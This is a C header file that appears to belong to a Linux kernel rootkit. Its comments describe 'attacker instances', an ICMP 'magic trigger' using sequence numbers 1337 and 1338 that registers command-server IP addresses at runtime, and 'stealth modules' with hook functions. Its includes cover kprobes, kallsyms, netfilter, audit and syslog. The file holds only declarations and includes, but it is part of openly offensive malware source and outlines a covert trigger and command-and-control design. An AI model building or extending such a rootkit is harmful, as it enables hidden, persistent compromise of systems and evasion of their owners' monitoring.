#ifndef CORE_H
#define CORE_H

/* Maximum number of attacker instances (one IP slot per instance) */
#define MAX_INSTANCES 2

/* Dynamic per-instance server IPs, populated at runtime when the ICMP magic
 * trigger arrives.  Slot 0 = magic seq 1337, slot 1 = magic seq 1338.
 * Defined in modules/icmp.c; all stealth modules read this array. */
extern __be32 g_srv_ips[MAX_INSTANCES];

/* Protects g_srv_ips[] against concurrent writes (ICMP softirq) and reads
 * (hook functions in various contexts).  Always use spin_lock_irqsave /
 * spin_unlock_irqrestore so it is safe regardless of caller context. */
extern spinlock_t g_srv_ips_lock;

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/tcp.h>
#include <net/inet_sock.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/seq_file.h>
#include <linux/netdevice.h>
#include <linux/skbuff.h>
#include <linux/sysinfo.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/stat.h>
#include <linux/uio.h>
#include <linux/mount.h>
#include <linux/bpf.h>
#include <linux/fdtable.h>
#include <linux/spinlock.h>
#include <linux/ctype.h>
#include <linux/jiffies.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/workqueue.h>
#include <net/ipv6.h>
#include <linux/tracepoint.h>
#include <linux/io_uring.h>
#include <linux/netlink.h>
#include <net/netlink.h>
#include <net/sock.h>
#include <linux/audit.h>
#include <net/net_namespace.h>
#include <linux/syslog.h>
#include <linux/vmalloc.h>
#include <linux/genetlink.h>
#include <net/genetlink.h>
#include <linux/taskstats.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_conntrack.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/kallsyms.h>
#include <linux/printk.h>
#include <linux/cred.h>
#include <linux/sched.h>
#endif
